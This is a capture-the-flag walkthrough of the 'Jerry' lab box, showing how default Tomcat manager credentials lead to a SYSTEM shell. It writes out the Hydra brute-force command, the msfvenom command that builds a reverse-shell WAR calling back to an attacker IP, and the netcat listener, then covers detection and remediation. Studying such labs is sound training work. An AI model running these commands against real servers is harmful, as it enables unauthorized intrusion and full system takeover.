Jerry

A single exposed Tomcat manager with default credentials hands over a SYSTEM shell in three commands — no chaining, no privesc, just a door nobody bothered to lock.

00 Why this box matters

Jerry looks trivial on paper — one open port, one login form, one file upload — and that's exactly the point. A huge share of real-world breaches don't involve chained exploits or kernel bugs; they involve an admin console shipped with a vendor default password that nobody rotated. Apache Tomcat's manager application, when reachable and still using tomcat:s3cret or similar factory creds, is a direct path to remote code execution because the manager interface is designed to deploy arbitrary code (WAR files) to the server. This box is a clean demonstration of why credential hygiene on management interfaces is not optional.

01 Recon

Standard port sweep first. A single web service stood out on a non-standard port.

 nmap
$ nmap -sC -sV -p- 10.10.10.95
# trimmed
PORT     STATE SERVICE VERSION
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88

Port 8080 serving an Apache Tomcat default landing page was the obvious lead — everything else was standard Windows SMB/RPC noise.

02 Enumeration — the manager portal

Browsing to http://10.10.10.95:8080 served the stock Tomcat splash page, which links directly to the /manager/html application — the built-in admin console used to deploy, undeploy, and manage web applications on the server.

Mechanism first

The Tomcat Manager app is intentionally powerful: it accepts WAR file uploads and immediately deploys them as live web applications under the Tomcat service account. On Windows, Tomcat is frequently installed and run as SYSTEM, so any code executed through a deployed WAR runs with the highest privilege on the box. This turns an authentication bypass on the manager login into instant SYSTEM-level RCE — no separate privilege escalation step required.

The login prompt used HTTP Basic Auth, which meant it was directly brute-forceable with a wordlist attack.

03 Credential attack — Hydra

Rather than guessing manually, the manager login was brute-forced with Hydra against a small list of known Tomcat default credential pairs.

 hydra
$ hydra -L users.txt -P passwords.txt 10.10.10.95 -s 8080 http-get /manager/html
# output
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret

The credential pair resolved almost immediately — this was a factory-default combination, not a cracked hash. That distinction matters: no computational cost, no offline attack, just an unrotated default sitting on an internet-facing service.

04 Payload build — msfvenom

With valid manager credentials, the next step was crafting a malicious WAR containing a reverse shell payload.

Mechanism first

A WAR file is just a packaged Java web application. msfvenom can generate one containing a JSP page that, when requested over HTTP, spawns a shell back to an attacker-controlled listener. Because the Tomcat manager's whole purpose is to accept and deploy these packages, there is no exploit in the traditional sense here — it's abuse of designed functionality with no authorization boundary beyond the (broken) login.

 msfvenom
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
# shell.war generated
05 Deployment and shell

The generated WAR was uploaded directly through the manager's deploy form, and Tomcat auto-registered it as a live application path.

 listener
$ nc -lvnp 4444
# then, in browser: http://10.10.10.95:8080/shell/shell.jsp
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49823
Microsoft Windows [Version ...]
nt authority\system

Visiting the deployed page triggered the JSP payload server-side, and the reverse shell connected back immediately — already running as NT AUTHORITY\SYSTEM because that's the account the Tomcat service was configured under. Flag retrieval from here was trivial.

06 Detection
  • HTTP Basic Auth failures against /manager/html at high frequency from a single source — classic brute-force signature, easily alerted on.
  • WAR file deployment events in Tomcat's own logs (catalina.out / manager access logs) are rarely reviewed but show exactly when and what was deployed.
  • A newly deployed application spawning cmd.exe or making outbound connections to an unfamiliar IP is a strong EDR/behavioral signal for a web-shell-style compromise.
07 Remediation
  1. Kill default credentials. Every Tomcat manager deployment should force a unique, generated password at install time — never ship or leave tomcat:s3cret-style defaults.
  2. Restrict manager access. The manager application should not be reachable from the general internet at all; bind it to localhost or a management VLAN with IP allow-listing.
  3. Least privilege for the service account. Tomcat should never run as SYSTEM — a dedicated low-privilege service account limits blast radius even if the manager is compromised.
  4. Gate deployment capability. Treat WAR upload/deploy as a code-shipping action: require a small, audited group of operators and a review step before anything reaches production, exactly like a CI/CD approval gate.

Jerry isn't a lesson in sophisticated exploitation — it's a lesson in what happens when a powerful admin interface is left exposed with a password nobody changed. The entire chain from recon to SYSTEM took four tools and zero custom exploit code. That's the real risk model most organizations face: not zero-days, but defaults.
